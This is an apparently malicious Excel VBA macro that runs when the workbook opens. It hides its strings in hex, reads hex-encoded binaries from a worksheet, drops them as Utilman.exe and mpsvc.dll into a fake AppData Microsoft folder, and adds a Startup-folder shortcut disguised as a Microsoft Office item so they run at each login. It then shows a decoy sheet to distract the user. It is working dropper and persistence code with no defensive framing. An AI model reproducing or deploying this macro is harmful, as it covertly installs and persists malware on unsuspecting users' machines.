Const numTwo = 2
Const numOne = 1
Const numZero = 0
Public payload_1_Name As String
Public payload_2_Name As String
Public shortcutName As String
Public b As String

Private Sub OnOpen()
	b = hexToAscii("42") ' B
	payload_1_Name = hexToAscii("5574696c6d") & hexToAscii("616e2e657865") ' Utilman.exe
	payload_2_Name = hexToAscii("6d70737663") & hexToAscii("2e646c6c") ' mpsvc.dll
	shortcutName = hexToAscii("50726f6772616d44") & hexToAscii("61746155706461746572") + b
	shortcutName = shortcutName + hexToAscii("2e6c") & hexToAscii("6e6b") ' ProgramDataUpdaterB.lnk
	
	deploy
	showDummyWorksheet
End Sub

Function removeSpaces(strs) As String
	' Remove spaces
	Dim original As String
	Dim retValue As String
	Dim current As String
	Dim i As Integer
	
	original = strs
	For i = 1 To VBA.Len(original)
		current = Left(Mid(original, i), numOne)
		If current = hexToAscii("20") Or current = hexToAscii("20") Then '0x20=Space
		Else
			retValue = retValue & "" & current
		End If
	Next i
	
	removeSpaces = retValue ' Return value
End Function

Public Function strToBin(ByVal binStrings As String) As Byte()
	Dim stringsLen As Long
	Dim binSize As Long
	Dim retValueByte() As Byte
	Dim offset As Long
	
	stringsLen = Len(binStrings) ' Bin strings length
	binSize = stringsLen / 2
	Dim range As Long
	range = binSize - 1
	ReDim retValueByte(0 To range)
	
	For i = 1 To stringsLen Step 2
		retValueByte(offset) = Val(hexToAscii("2668") & Mid(binStrings, i, numTwo)) ' 2668=&h
		offset = offset + 1
	Next i
	
	strToBin = retValueByte ' Return value (Binary)
End Function

Function getAppDataFolder() As String
	Dim appdata As String
	
	appdata = hexToAscii("415050444154") & hexToAscii("41") ' APPDATA
	
	getAppDataFolder = Environ(appdata) ' C:\Users\<UserName>\AppData\Roaming
End Function

Function getDeployFolder() As String
	Dim deployFolder As String
	Dim msFolderName As String
	Dim objectName As String
	Dim fs As Object
	
	objectName = hexToAscii("536372697074696e672e46696c6553797374656d4f62") & hexToAscii("6a656374") ' Scripting.FileSystemObject
	
	Set fs = CreateObject(objectName)
	msFolderName = hexToAscii("5c4d696372") & hexToAscii("6f736f66745c436f72706f726174696f6e5c") ' \Microsoft\Corporation\
	deployFolder = getAppDataFolder() + msFolderName ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Corporation\
	
	If Not fs.folderexists(deployFolder) Then
		fs.createfolder (deployFolder)
	End If
	
	getDeployFolder = deployFolder ' Return value
End Function

Function getStartupFolder() As String
	Dim startupFolder As String
	Dim startup As String
	
	startup = hexToAscii("5c4d6963726f736f66745c57696e") & hexToAscii("646f77735c5374617274204d656e755c50726f6772616d735c537461727475705c") ' \Microsoft\Windows\Start Menu\Programs\Startup\
	startupFolder = getAppDataFolder() + startup ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
	
	getStartupFolder = startupFolder ' Return value
End Function

Function readWorksheet(sheet As Integer, col As Integer) As String
	Dim strchar, retValue As String
	Dim i
	
	i = 1
	For r = 1 To Worksheets(sheet).UsedRange.Rows.Count
		strchar = Worksheets(sheet).Cells(r, col).Text
		If strchar = "" Then
		Else
			strchar = removeSpaces(strchar)
			retValue = retValue + strchar
		End If
		i = i + 1
	Next
	
	readWorksheet = retValue ' Return value (binary strings without spaces)
End Function

Sub writePayload(binStrings As String, targetPath As String)
	Dim bytes() As Byte
	
	If Not Dir(targetPath) <> "" Then
		bytes = strToBin(binStrings)
		Open targetPath For Binary Access Write As #1
		Put #1, , bytes
	End If
	Close #1
End Sub

Sub deploy()
	Dim deployFolder As String
	Dim fullPath_1 As String
	Dim fullPath_2 As String
	Dim binStr_1  As String
	Dim binStr_2  As String
	
	deployFolder = getDeployFolder() ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Corporation\
	fullPath_1 = deployFolder + payload_1_Name ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Corporation\Utilman.exe
	fullPath_2 = deployFolder + payload_2_Name ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Corporation\mpsvc.dll
	binStr_1 = readWorksheet(3, numOne)
	binStr_2 = readWorksheet(3, numTwo)
	
	Call writePayload(binStr_1, fullPath_1) 'Bin strings, Utilman.exe
	Call writePayload(binStr_2, fullPath_2) ' Bin strings, mpsvc.dll
	
	Call createStartup(fullPath_1) ' Utilman.exe
End Sub

Sub createStartup(linkTo As String)
	Dim startupFolder As String
	Dim startupFileFullPath As String
	Dim objectName As String
	Dim description As String
	
	startupFolder = getStartupFolder() ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
	startupFileFullPath = startupFolder + shortcutName ' C:\Users\<UserName>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ProgramDataUpdaterB.lnk
	description = hexToAscii("4d6963726f736f6674204f66666963") & hexToAscii("6520436f72706f726174696f6e") ' Microsoft Office Corporation
	objectName = hexToAscii("575363726970") & hexToAscii("742e5368656c6c") ' WScript.Shell
	
	With CreateObject(objectName).CreateShortcut(startupFileFullPath)
		.TargetPath = linkTo
		.Description = description
		.Save
	End With
End Sub

Sub showDummyWorksheet()
	Dim sheet_1_name As String
	Dim sheet_2_name As String
	
	sheet_2_name = hexToAscii("73686565") & hexToAscii("7432") ' sheet2
	sheet_1_name = hexToAscii("73686565") & hexToAscii("7431") ' sheet1
	
	Application.ScreenUpdating = True
	Worksheets(sheet_2_name).Visible = True
	Worksheets(sheet_1_name).Visible = False
	Worksheets(sheet_2_name).Activate
	Worksheets(sheet_2_name).Select
End Sub

Private Function hexToAscii(ByVal hexString As String) As String
	Dim i As Long
	
	For i = 1 To Len(hexString) Step 2
		hexToAscii = hexToAscii & Chr$(Val("&H" & Mid$(hexString, i, 2)))
	Next i
End Function

